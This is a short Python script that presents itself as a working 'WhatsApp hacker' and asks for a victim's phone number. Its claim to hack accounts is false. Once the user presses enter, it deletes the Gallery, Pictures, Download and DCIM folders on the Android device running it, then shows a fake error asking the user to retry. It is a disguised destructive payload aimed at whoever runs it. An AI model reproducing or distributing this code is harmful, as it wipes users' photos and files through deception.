import os
import sys
import shutil
os.system('clear')
print("""
┏┓┏┓┏┓┏┳━━┳━┳┳┳━┳━┓
┗┓┏┛┃┗┛┃┏┓┃┏┫┏┫┳┫╋┃
┏┛┗┓┃┏┓┃┣┫┃┗┫┗┫┻┫┓┫
┗┛┗┛┗┛┗┻┛┗┻━┻┻┻━┻┻┛""")
print("            WELCOME TO WHATSAPP HACKER\n         NO FAKE 100% REAL")
print("            CREATED BY ERROR 4 YOU (E4Y)")
country=input("[1]Enter country code>>")
number=input("[2)]Enter victim's number without country code>>")
print("Do you want to hack "+country+number+" ?")
conti=input("Press enter to Hack the WhatsApp account:")
print("Please wait...................")
try:
	shutil.rmtree("/storage/emulated/0/Gallery")
	shutil.rmtree("/storage/emulated/0/Pictures")
	shutil.rmtree("/storage/emulated/0/Download")
	shutil.rmtree("/storage/emulated/0/DCIM")
except:
	print("Sorry,an error occured.Please Retry tool..")

